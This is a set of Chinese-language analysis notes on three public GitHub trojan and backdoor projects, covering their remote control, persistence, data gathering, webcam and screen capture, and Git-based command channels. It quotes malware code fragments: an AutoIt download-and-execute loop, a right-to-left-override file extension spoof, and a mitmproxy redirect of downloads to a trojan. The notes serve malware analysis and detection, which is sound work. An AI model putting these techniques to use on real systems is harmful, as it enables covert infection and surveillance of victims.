1.https://github.com/swagkarna/Backdoor-Trojan
    client.py：
    这是后门的主要代码，运行在受害者的机器上。它连接到攻击者的服务器，并接受从服务器发送的命令来执行。在执行完命令后，结果会返回给服务器。
    以下是代码中的一些关键特征和分析：
    1. 连接到远程服务器
        socket.connect((HOST, PORT)): 程序试图连接到指定的主机和端口。这是典型的RAT行为，木马会连接到攻击者的服务器以接受命令。
    2. 持久化
        shutil.copyfile(f"{filename}", Startup_Path): 代码将自身复制到启动文件夹，以确保每次系统启动时都能自动运行。这是保持持久化访问的一种方法。
        subprocess.Popen(Startup_Path, shell=True): 启动被复制到启动文件夹的可执行文件。
    3. 信息收集
        Public_IP = urllib.request.urlopen("https://ident.me", timeout=30).read(): 获取受感染机器的公共IP地址。
        send(objSocket.getsockname()[0].encode() + b" " + socket.gethostname().encode() + b" " + username.encode() + b" " + system.encode() + b" " + Public_IP): 将IP地址、主机名、用户名、操作系统版本和公共IP地址发送给攻击者。
    4. 远程执行命令
        RemoteCMD(): 允许攻击者通过远程发送命令，在受害者的机器上执行命令行操作，并将输出返回给攻击者。
        PythonInterpreter(): 允许攻击者远程执行Python代码，并返回执行结果。这种功能通常用于执行更复杂的攻击脚本。
    5. 文件操作
        ViewFiles(): 列出受害者系统中的文件和目录。
        SendFile(filepath) 和 ReceiveFile(filename, buffersize): 允许文件的上传和下载。
        Delete(): 删除指定的文件或目录。
    6. 恶意功能
        Screenshot(): 截屏功能，将截图发送给攻击者。
        Webcam(): 使用摄像头捕捉图像并发送给攻击者。这可能侵犯用户的隐私。
        MessageBox(message): 通过显示消息框干扰用户。
        OpenWebpage(url): 在受害者的系统上打开指定的网页。
    7. 系统控制
        shutdown-pc、restart-pc 和 lock-pc: 这些命令可以关闭、重启或锁定受害者的计算机。
    8. 文件清理
        ClearFiles(): 清除在受害者计算机上生成的文件，以掩盖痕迹。
    总结
    该脚本表现出典型的木马后门特征，包括远程控制、持久化、信息收集、文件操作、屏幕和摄像头捕捉以及系统控制等。该程序可以完全控制受感染的系统，并进行一系列恶意操作。对于这样的代码，建议在安全环境下进行分析，避免在实际系统上运行。

2.https://github.com/z00z/TrojanFactory.git
    木马后门的特征
    1.远程控制和下载：
        特征：木马后门会从远程服务器下载并执行恶意文件。
        代码分析：
        在 Trojan 类的 create 方法中，木马会生成一个AutoIt脚本，该脚本会从指定的URL下载文件并执行。下载的文件通常是恶意文件。
        示例代码：
        Local $urlsArray = StringSplit($urls, ",", 2 )
        For $url In $urlsArray
            $sFile = _DownloadFile($url)
            shellExecute($sFile)
        Next
    2.编译木马：
        特征：生成的木马后门会被编译成可执行文件，通常带有伪装或隐蔽性特征。
        代码分析：
        使用 Aut2Exe 工具将AutoIt脚本编译成可执行文件。编译过程涉及将脚本转换为可执行的二进制文件。
        示例代码：
        subprocess.call('wine "' + AUT2EXE + '" /In "' + TROJAN_SOURCE_CODE_FILE + '" /Out "' + self.out_file +'" /Icon "' + self.icon + '"' , shell=True)
    3.伪装和隐藏：
        特征：木马后门可以伪装成其他类型的文件，并使用自定义图标来掩盖其真实目的。
        代码分析：
        通过在URL中添加伪装后缀来改变木马的扩展名，使其看起来像正常文件。例如，可能会将木马文件的扩展名改为.pdf或其他非执行文件类型。
        示例代码：
        if SPOOF_EXTENSION == True: 
            print("[+] Renaming trojan to spoof its extension")
            front_file_extension = flow.request.pretty_url.split("/")[-1].split(".")[-1]
            if front_file_extension != "exe":
                new_name = front_file_name + "‮" + "".join(reversed(front_file_extension))  + ".exe"
                spoofed_file = WEB_ROOT + new_name
                os.rename(trojan_file, spoofed_file)
    4.自动化生成和编译：
        特征：脚本自动化生成和编译木马程序，减少了手动操作。
        代码分析：
        提供了一个命令行工具，用于从指定的URL生成木马代码，编译木马程序，并且可以选择是否将其打包成ZIP文件以增加隐蔽性。
        示例代码：
        trojan = Trojan(options.front_file_url, options.evil_file_url, options.icon_path, options.out_file_path, 0)
        trojan.create()
        trojan.compile()
    5.代理劫持和重定向：
        特征：使用代理工具（如 mitmproxy）来劫持HTTP请求，并将请求重定向到伪装的木马文件。
        代码分析：
        通过代理捕获目标文件的下载请求，将请求重定向到生成的木马文件URL，从而实现恶意文件的分发。
        示例代码：
        def request(flow):
            if flow.request.host != IP and flow.request.pretty_url.endswith(tuple(TARGET_TEXTENSIONS)):
                # 生成并编译木马代码
                # 伪装木马文件的扩展名
                # 重定向到木马文件的URL
                flow.response = mitmproxy.http.Response.make(301, "", {"Location": torjan_download_url})
    综合分析
    远程下载和执行：木马后门通过从远程URL下载文件并执行，使得攻击者能够动态地控制感染的系统。
    伪装性：木马后门通过修改文件扩展名和使用自定义图标来掩盖其真实意图，增加用户点击和执行的可能性。
    自动化：木马生成和编译过程的自动化简化了攻击者的操作流程，使得木马的部署更加高效。
    代理劫持：利用代理工具劫持下载流量，将用户的下载请求重定向到恶意木马文件，增加了攻击的隐蔽性。
    总结
    这些代码示例展示了一个相对完整的木马后门生成和部署流程，包括木马代码的生成、编译、伪装、以及通过代理工具劫持下载流量。木马后门通过这些特征和技术手段来增加其隐蔽性和感染成功率。理解这些特征对于增强网络安全防御和检测潜在的恶意活动至关重要。

3.https://github.com/laurensDSM/python_trojan.git
    1. 模块初始化和配置
    特征: 代码中的 Trojan 类在初始化时接受一个 GitHub 仓库 URL，并且通过 Github 类与远程仓库建立连接。这表明木马后门可能需要从远程服务器获取配置或执行命令。
    分析: 这表明木马后门依赖于远程仓库来控制其行为，如配置文件和模块。这种机制使得攻击者可以随时修改木马的行为，而不需要直接访问受感染的系统。
    2. 运行和日志记录
    特征: 在 run 方法中，木马后门在首次运行时生成一个唯一的 ID，并创建日志目录。之后，每分钟检查远程仓库，下载并运行新的模块，更新配置，并将日志上传到 GitHub。
    分析: 这种周期性操作表明木马后门会定期与远程服务器通信，执行更新并报告其状态。这有助于攻击者跟踪受感染主机的状态，并在必要时更新恶意代码。
    3. 动态模块加载
    特征: run_modules 方法从配置文件中读取模块信息，动态加载并运行这些模块。模块的类和方法是在运行时通过 import_module 动态导入的。
    分析: 动态加载模块是一种常见的特征，使得木马可以根据配置文件的内容执行不同的操作。这种方法允许攻击者灵活地控制恶意代码，而不需要重新编译或部署木马。
    4. 配置文件和日志操作
    特征: generate_unique_id 方法生成唯一的 ID 以标识不同的受感染主机。create_directory_in_logs 方法创建一个用于存放日志的目录。send_logs_to_github 方法将日志文件上传到远程 GitHub 仓库。
    分析: 这些操作表明木马后门会为每台受感染的主机生成唯一的标识符，并将日志数据上传到远程服务器。这种机制使得攻击者能够跟踪每台感染主机的活动，同时保持日志的隐蔽性。
    5. 网络和 Git 操作
    特征: Github 类通过 Git 操作与远程仓库交互，包括克隆仓库、拉取更新、提交更改和推送日志。
    分析: 使用 Git 操作是木马后门的一种隐蔽技术，可以绕过一些常规的防护措施。木马利用 Git 进行数据传输和命令控制，使其行为更加隐蔽和难以检测。
    总结
    综合以上特征，木马后门在代码中的特征模式包括：
    依赖远程控制: 木马从远程仓库获取配置和模块，并定期与远程服务器通信。
    动态行为: 通过动态加载模块和配置文件来执行不同的操作，增加其隐蔽性。
    日志记录和上报: 生成唯一的 ID 记录日志，并将日志上传到远程服务器，以便攻击者跟踪和控制受感染主机。
    网络和 Git 操作: 使用 Git 技术进行数据传输和更新，隐藏其恶意行为。
    这些特征模式表明该木马后门的设计旨在隐藏其活动并在受感染的系统中维持持久性。







